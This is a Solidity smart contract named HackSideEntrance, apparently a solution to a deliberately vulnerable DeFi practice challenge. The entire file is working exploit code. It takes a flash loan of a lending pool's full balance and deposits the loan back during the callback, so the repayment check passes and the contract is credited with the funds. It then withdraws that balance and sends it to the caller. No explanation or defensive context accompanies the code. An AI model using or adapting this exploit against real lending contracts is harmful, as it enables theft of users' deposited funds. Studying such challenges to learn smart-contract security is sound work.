// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./SideEntranceLenderPool.sol";

contract HackSideEntrance {
    SideEntranceLenderPool pool;

    constructor(SideEntranceLenderPool _pool) {
        pool = _pool;
    }

    function hack() external payable {
        pool.flashLoan(address(pool).balance);

        pool.withdraw();

        payable(msg.sender).call{value: address(this).balance}("");
    }

    function execute() external payable {
        pool.deposit{value: address(this).balance}();
    }

    receive() external payable {}
}
